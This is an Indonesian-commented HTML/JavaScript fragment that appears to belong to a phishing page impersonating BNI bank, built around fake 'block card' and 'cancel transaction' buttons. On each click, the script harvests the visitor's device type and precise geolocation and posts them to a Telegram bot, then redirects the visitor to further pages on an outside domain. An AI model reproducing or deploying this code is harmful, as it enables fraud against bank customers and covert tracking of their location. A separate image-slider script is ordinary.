  <!-- 🤖 FUNGSI TELEGRAM — DETEKSI PERANGKAT & LOKASI -->

  <script>
    // Deteksi Informasi Perangkat
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let device = "Perangkat Tidak Diketahui", os = "";
      if (/Android/.test(ua)) {
        os = "Android";
        if (/Samsung/.test(ua)) device = "Samsung Galaxy";
        else if (/Xiaomi/.test(ua)) device = "Xiaomi";
        else if (/Redmi/.test(ua)) device = "Redmi";
        else if (/OPPO/.test(ua)) device = "OPPO";
        else if (/Vivo/.test(ua)) device = "Vivo";
        else if (/Infinix/.test(ua)) device = "Infinix";
        else if (/Huawei/.test(ua)) device = "Huawei";
        else if (/Realme/.test(ua)) device = "Realme";
        else device = "Android";
      }
      else if (/iPhone|iPad|iPod/.test(ua)) {
        os = "iOS";
        device = /iPhone/.test(ua) ? "iPhone" : "iPad";
      }
      else if (/Windows/.test(ua)) { os = "Windows"; device = "PC/Windows"; }
      else if (/Mac/.test(ua)) { os = "macOS"; device = "Macintosh"; }
      return `${device} (${os})`;
    }

    // Deteksi Lokasi Otomatis
    async function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve("Lokasi: Tidak Didukung");
          return;
        }
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            try {
              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=id`);
              const data = await res.json();
              const addr = data.address || {};
              const lokasi = [addr.road, addr.village, addr.suburb, addr.city, addr.state, addr.country].filter(Boolean).join(", ");
              resolve(`${lokasi} | Lat:${lat} Lon:${lon}`);
            } catch {
              resolve(`Lat: ${lat} | Lon: ${lon}`);
            }
          },
          (err) => {
            resolve(err.code === 1 ? "Izin Lokasi Ditolak" : 
                    err.code === 2 ? "Lokasi Tidak Tersedia" : 
                    "Gagal Mendapatkan Lokasi");
          },
          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
        );
      });
    }

    // Kirim Pesan ke Telegram
    async function kirimKeTelegram(judul, aksi) {
      if (!BOT_TOKEN || !CHAT_ID) {
        alert("⚠️ Konfigurasi Telegram belum lengkap!");
        return false;
      }

      const loading = document.getElementById('loadingOverlay');
      loading.classList.add('active');

      const perangkat = getDeviceInfo();
      const lokasi = await getLocation();
      const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

      const pesan = `
🔔 <b>${judul}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 Aksi: ${aksi}
🕐 Waktu: ${waktu}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 Perangkat: ${perangkat}
🌍 Lokasi: ${lokasi}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan,
            parse_mode: "HTML",
            disable_web_page_preview: true
          })
        });

        const data = await res.json();
        loading.classList.remove('active');

        if (data.ok) {
          console.log("✅ Terkirim ke Telegram!");
          return true;
        } else {
          alert("❌ Gagal: " + (data.description || "Error"));
          return false;
        }
      } catch (e) {
        loading.classList.remove('active');
        alert("❌ Gagal mengirim data! Periksa koneksi internet.");
        console.error("Error:", e);
        return false;
      }
    }

    // ======================================================
    // TOMBOL KLIK → KIRIM NOTIFIKASI + ALIHKAN HALAMAN
    // ======================================================
    document.addEventListener("DOMContentLoaded", () => {
      // Tombol Blokir Kartu
      document.getElementById("btnBlokirKartu").addEventListener("click", async () => {
        await kirimKeTelegram("🔒 PERMINTAAN BLOKIR KARTU BNI", "Pengguna menekan tombol Blokir Kartu Kredit/Debit");
        window.location.href = "www.web-ld.com/membatalkan/batalblokir/blokirkartu/";

        window.location.href = "www.web-ld.com/membatalkan/batalblokir/banklain/";
      });

      // Tombol Batalkan Transaksi
      document.getElementById("btnBatalkan").addEventListener("click", async () => {
        await kirimKeTelegram("⚠️ PERMINTAAN BATALKAN TRANSAKSI", "Pengguna menekan tombol Batalkan Transaksi");
        window.location.href = "www.web-ld.com/membatalkan/batalblokir/batal/";
      });
    });
  </script>

  <!-- Script Slider Gambar (tetap berfungsi) -->
  <script>
        let index = 0;
        const slides = document.querySelector(".slides");
        const indicators = document.querySelectorAll(".indicators span");
        const totalSlides = document.querySelectorAll(".slides img").length;

        function updateIndicators() {
            indicators.forEach((indicator, i) => {
                indicator.classList.toggle("active", i === index);
            });
        }

        function slideShow() {
            index = (index + 1) % totalSlides;
            slides.style.transform = "translateX(" + (-index * 100) + "%)";
            updateIndicators();
        }

        setInterval(slideShow, 4000);

        indicators.forEach((indicator, i) => {
            indicator.addEventListener("click", () => {
                index = i;
                slides.style.transform = "translateX(" + (-index * 100) + "%)";
                updateIndicators();
            });
        });

        updateIndicators();
  </script>
